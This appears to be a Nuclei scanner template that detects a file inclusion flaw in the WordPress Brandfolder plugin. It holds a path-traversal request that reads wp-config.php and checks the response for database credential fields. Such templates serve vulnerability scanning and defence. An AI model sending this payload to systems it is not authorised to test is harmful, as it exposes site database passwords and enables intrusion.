http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
id: brandfolder-lfi
info:
  author: 0x_Akoko
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: WordPress Brandfolder allows remote attackers to access arbitrary files
    that reside on the local and remote server and disclose their content.
  metadata:
    max-request: 1
  name: Wordpress Brandfolder - Remote/Local File Inclusion
  reference:
  - https://www.exploit-db.com/exploits/39591
  - https://cxsecurity.com/issue/WLB-2016030120
  severity: high
  tags: lfi,rfi,edb,wordpress,wp-plugin,vuln
